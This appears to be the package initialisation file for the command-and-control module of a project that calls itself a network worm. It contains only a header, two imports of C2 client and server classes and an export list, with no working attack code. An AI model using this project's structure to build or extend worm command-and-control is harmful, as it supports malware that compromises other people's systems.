"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
C2 Module - Command and Control
"""


from c2.client import C2Client
from c2.server import C2Server

__all__ = ["C2Server", "C2Client"]
